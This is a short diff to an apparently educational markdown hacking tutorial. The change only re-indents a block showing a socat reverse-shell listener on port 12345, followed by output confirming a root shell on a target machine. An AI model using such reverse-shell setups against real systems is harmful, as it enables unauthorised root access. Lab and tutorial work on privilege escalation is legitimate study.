@@ -240,12 +240,12 @@ OR :
 
 If we successfully complete all those steps we get root power of target machine like that :
 
-socat file:`tty`,raw,echo=0 tcp-listen:12345
-/bin/sh: 0: can't access tty; job control turned off
-#id
-uid=0(root) gid=0(root) groups=0(root)
-#whoami
-root
+    socat file:`tty`,raw,echo=0 tcp-listen:12345
+    /bin/sh: 0: can't access tty; job control turned off
+    #id
+    uid=0(root) gid=0(root) groups=0(root)
+    #whoami
+    root
 
 #### 😍Happy Hacking 😍
     
